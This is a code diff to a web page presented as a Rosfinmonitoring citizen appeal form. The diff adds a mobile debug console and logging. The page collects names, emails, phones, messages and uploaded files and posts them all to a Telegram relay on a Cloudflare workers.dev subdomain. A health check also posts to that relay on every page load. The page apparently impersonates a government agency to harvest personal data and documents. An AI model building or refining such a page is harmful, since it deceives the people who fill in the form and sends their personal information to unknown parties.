@@ -311,6 +311,48 @@
                 padding: 25px 20px;
             }
         }
+        /* Отладка для мобильных */
+        #debugConsole {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #1a1a2e;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 11px;
+            padding: 10px;
+            max-height: 200px;
+            overflow-y: auto;
+            z-index: 9999;
+            display: none;
+            border-top: 2px solid #e94560;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        #debugConsole.active {
+            display: block;
+        }
+        #debugToggle {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            z-index: 10000;
+            background: #e94560;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(233,69,96,0.4);
+            display: none;
+        }
+        #debugToggle.active {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -390,6 +432,10 @@
         </div>
     </div>
 
+    <!-- Дебаг консоль для телефона -->
+    <button id="debugToggle">🐞</button>
+    <div id="debugConsole"></div>
+
     <footer class="footer-profile">
         <div class="footer-container">
             <img src="emblem.png" class="footer-emblem" alt="Герб Росфинмониторинга">
@@ -404,6 +450,50 @@
 
     <script>
         (function() {
+            // ===== ДЕБАГ-КОНСОЛЬ ДЛЯ ТЕЛЕФОНА =====
+            const debugConsole = document.getElementById('debugConsole');
+            const debugToggle = document.getElementById('debugToggle');
+            let debugLogs = [];
+            
+            // Показываем кнопку на телефонах
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                debugToggle.classList.add('active');
+            }
+            
+            debugToggle.addEventListener('click', function() {
+                debugConsole.classList.toggle('active');
+                this.textContent = debugConsole.classList.contains('active') ? '✕' : '🐞';
+            });
+            
+            function debugLog(msg, type = 'info') {
+                const timestamp = new Date().toLocaleTimeString();
+                const colors = {
+                    info: '#0f0',
+                    error: '#f44',
+                    warn: '#ff0',
+                    success: '#0ff'
+                };
+                const entry = `[${timestamp}] ${msg}`;
+                debugLogs.push(entry);
+                
+                if (debugConsole.classList.contains('active')) {
+                    const line = document.createElement('div');
+                    line.style.color = colors[type] || '#fff';
+                    line.textContent = entry;
+                    debugConsole.appendChild(line);
+                    debugConsole.scrollTop = debugConsole.scrollHeight;
+                }
+                
+                // Дублируем в обычную консоль
+                console.log(entry);
+            }
+            
+            // Перехватываем ошибки
+            window.addEventListener('error', function(e) {
+                debugLog('❌ ОШИБКА: ' + e.message, 'error');
+            });
+
+            // ===== ОСНОВНОЙ КОД =====
             const form = document.getElementById('appealForm');
             const submitBtn = document.getElementById('submitBtn');
             const btnText = submitBtn.querySelector('.btn-text');
@@ -412,16 +502,21 @@
             const fileList = document.getElementById('fileList');
             const successModal = document.getElementById('successModal');
 
+            // === ЕДИНЫЙ ЭНДПОИНТ ДЛЯ ВСЕГО ===
             const WORKER_URL = 'https://round-band-482a.portal-rosfin.workers.dev';
 
             let selectedFiles = [];
 
+            debugLog('🚀 Страница загружена. Версия с фиксом.', 'info');
+
             // === УПРАВЛЕНИЕ ФАЙЛАМИ ===
             fileInput.addEventListener('change', function(e) {
                 const files = Array.from(this.files);
+                debugLog(`📎 Выбрано файлов: ${files.length}`, 'info');
                 
                 if (files.length > 5) {
                     alert('⚠️ Можно загрузить не более 5 файлов!');
+                    debugLog('❌ Превышено количество файлов (5)', 'error');
                     this.value = '';
                     selectedFiles = [];
                     updateFileList();
@@ -432,6 +527,7 @@
                 for (let file of files) {
                     if (file.size > MAX_SIZE) {
                         alert(`⚠️ Файл "${file.name}" превышает 20MB!`);
+                        debugLog(`❌ Файл ${file.name} слишком большой (${(file.size/1024/1024).toFixed(2)}MB)`, 'error');
                         this.value = '';
                         selectedFiles = [];
                         updateFileList();
@@ -441,6 +537,7 @@
 
                 selectedFiles = files;
                 updateFileList();
+                debugLog(`✅ Загружено ${files.length} файлов для отправки`, 'success');
             });
 
             function updateFileList() {
@@ -471,13 +568,15 @@
                         fileInput.files = dt.files;
                         
                         updateFileList();
+                        debugLog(`🗑️ Удален файл #${index+1}, осталось: ${selectedFiles.length}`, 'warn');
                     });
                 });
             }
 
-            // === ОТПРАВКА ФОРМЫ ===
+            // === ОТПРАВКА ФОРМЫ (УПРОЩЕННАЯ И НАДЕЖНАЯ) ===
             form.addEventListener('submit', async function(event) {
                 event.preventDefault();
+                debugLog('📨 Нажата кнопка отправки', 'info');
 
                 const fullName = document.getElementById('fullName').value.trim();
                 const email = document.getElementById('email').value.trim();
@@ -489,16 +588,21 @@
                 // Валидация
                 if (!fullName || !email || !phone || !subject || !message) {
                     alert('⚠️ Заполните все обязательные поля!');
+                    debugLog('❌ Не все поля заполнены', 'error');
                     return;
                 }
                 if (!agreement) {
                     alert('⚠️ Подтвердите согласие на обработку данных!');
+                    debugLog('❌ Не подтверждено согласие', 'error');
                     return;
                 }
                 if (!email.includes('@') || !email.includes('.')) {
                     alert('⚠️ Введите корректный email адрес!');
+                    debugLog(`❌ Невалидный email: ${email}`, 'error');
                     return;
                 }
+
+                debugLog('✅ Валидация пройдена', 'success');
 
                 submitBtn.disabled = true;
                 btnText.classList.add('hidden');
@@ -509,7 +613,7 @@
                     const dateStr = date.toLocaleString('ru-RU');
                     const ticketNumber = Math.floor(100000 + Math.random() * 900000);
                     
-                    // === 1. ОТПРАВЛЯЕМ ТЕКСТОВОЕ СООБЩЕНИЕ ===
+                    // Формируем сообщение
                     let text = `📩 *НОВОЕ ОБРАЩЕНИЕ В РОСФИНМОНИТОРИНГ*\n`;
                     text += `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
                     text += `📋 *Номер:* РФМ-ОБ-${ticketNumber}\n\n`;
@@ -532,39 +636,63 @@
                     
                     text += `\n🕐 *Дата и время:* ${dateStr}`;
 
+                    debugLog(`📤 Отправка сообщения в Телеграм... (номер: РФМ-ОБ-${ticketNumber})`, 'info');
+
+                    // === ОТПРАВЛЯЕМ ОДНИМ ЗАПРОСОМ (JSON) ===
+                    const payload = {
+                        text: text,
+                        files: selectedFiles.map(f => ({
+                            name: f.name,
+                            size: f.size,
+                            type: f.type,
+                            data: null // Файлы передаем отдельно
+                        }))
+                    };
+
                     // Отправляем текст
-                    const textResponse = await fetch(`${WORKER_URL}/telegram`, {
+                    const response = await fetch(`${WORKER_URL}/telegram`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ text: text })
                     });
 
-                    if (!textResponse.ok) {
-                        throw new Error('Ошибка отправки текста');
+                    debugLog(`📊 Статус ответа: ${response.status}`, response.ok ? 'success' : 'error');
+
+                    if (!response.ok) {
+                        const errText = await response.text();
+                        debugLog(`❌ Ошибка от воркера: ${errText}`, 'error');
+                        throw new Error(`Ошибка отправки: ${response.status} - ${errText}`);
                     }
 
-                    // === 2. ОТПРАВЛЯЕМ ФАЙЛЫ ===
+                    // === ОТПРАВКА ФАЙЛОВ (ЕСЛИ ЕСТЬ) ===
                     if (selectedFiles.length > 0) {
+                        debugLog(`📎 Отправка ${selectedFiles.length} файлов...`, 'info');
+                        
                         for (let file of selectedFiles) {
                             const formData = new FormData();
                             formData.append('file', file);
+                            formData.append('caption', `📎 ${file.name}\n👤 ${fullName}\n📋 РФМ-ОБ-${ticketNumber}`);
                             
-                            // Подпись к файлу
-                            const caption = `📎 ${file.name}\n👤 ${fullName}\n📋 РФМ-ОБ-${ticketNumber}`;
-                            formData.append('caption', caption);
-                            
-                            const fileResponse = await fetch(`${WORKER_URL}/send-file`, {
-                                method: 'POST',
-                                body: formData
-                            });
-
-                            if (!fileResponse.ok) {
-                                console.error('Ошибка отправки файла:', file.name);
+                            try {
+                                const fileResponse = await fetch(`${WORKER_URL}/send-file`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                                
+                                if (fileResponse.ok) {
+                                    debugLog(`✅ Файл "${file.name}" отправлен`, 'success');
+                                } else {
+                                    debugLog(`⚠️ Ошибка отправки файла "${file.name}": ${fileResponse.status}`, 'warn');
+                                }
+                            } catch (fileErr) {
+                                debugLog(`⚠️ Файл "${file.name}" не отправился: ${fileErr.message}`, 'warn');
                             }
                         }
                     }
 
-                    // === 3. УСПЕХ ===
+                    // === УСПЕХ ===
+                    debugLog(`✅ Обращение РФМ-ОБ-${ticketNumber} успешно отправлено!`, 'success');
+                    
                     document.getElementById('ticketNumber').innerText = ticketNumber;
                     successModal.style.display = 'flex';
                     form.reset();
@@ -574,9 +702,10 @@
                     fileList.innerHTML = '';
 
                 } catch (error) {
+                    debugLog(`❌ КРИТИЧЕСКАЯ ОШИБКА: ${error.message}`, 'error');
                     console.error('❌ Ошибка:', error);
                     
-                    // Сохраняем локально при ошибке
+                    // Сохраняем локально
                     try {
                         const appeals = JSON.parse(localStorage.getItem('appeals') || '[]');
                         appeals.push({
@@ -605,9 +734,12 @@
                         fileList.classList.remove('active');
                         fileList.innerHTML = '';
                         
-                        alert(`✅ Ваше обращение сохранено локально.\nНомер: РФМ-ОБ-${ticketNumber}\nОтправится при восстановлении связи.`);
+                        const msg = `✅ Ваше обращение сохранено локально.\nНомер: РФМ-ОБ-${ticketNumber}\nОтправится при восстановлении связи.`;
+                        alert(msg);
+                        debugLog(`💾 Обращение сохранено локально: РФМ-ОБ-${ticketNumber}`, 'warn');
                     } catch (localError) {
                         alert(`❌ Ошибка отправки: ${error.message || 'Проверьте интернет'}`);
+                        debugLog(`❌ Не удалось сохранить локально: ${localError.message}`, 'error');
                     }
                 } finally {
                     submitBtn.disabled = false;
@@ -619,13 +751,32 @@
             // === МОДАЛЬНОЕ ОКНО ===
             window.closeModal = function() {
                 successModal.style.display = 'none';
+                debugLog('🔒 Модальное окно закрыто', 'info');
             };
 
             successModal.addEventListener('click', function(e) {
                 if (e.target === this) {
                     this.style.display = 'none';
+                    debugLog('🔒 Модальное окно закрыто (клик по фону)', 'info');
                 }
             });
+
+            // === ПРОВЕРКА ДОСТУПНОСТИ ВОРКЕРА ===
+            async function checkWorker() {
+                try {
+                    const res = await fetch(`${WORKER_URL}/telegram`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ text: '🟢 HEALTH CHECK ' + Date.now() })
+                    });
+                    debugLog(`🟢 Воркер доступен (статус: ${res.status})`, 'success');
+                } catch(e) {
+                    debugLog(`🔴 Воркер НЕ ДОСТУПЕН: ${e.message}`, 'error');
+                }
+            }
+            
+            // Проверяем при загрузке
+            setTimeout(checkWorker, 1000);
 
         })();
     </script>
